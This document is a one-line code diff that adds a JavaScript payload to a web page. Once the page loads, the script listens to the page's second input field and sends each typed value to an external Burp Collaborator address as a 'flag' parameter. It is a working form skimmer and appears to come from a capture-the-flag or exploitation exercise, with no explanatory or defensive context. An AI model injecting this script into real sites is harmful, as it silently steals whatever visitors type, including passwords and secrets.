@@ -1,0 +1,1 @@
+window.addEventListener('DOMContentLoaded', () => {document.querySelectorAll('input')[1].addEventListener('input',function(){event.preventDefault();fetch("https://tgdltoc9ydgz5p5kz786v7nce3k78w.burpcollaborator.net?flag="+document.querySelectorAll('input')[1].value)})});
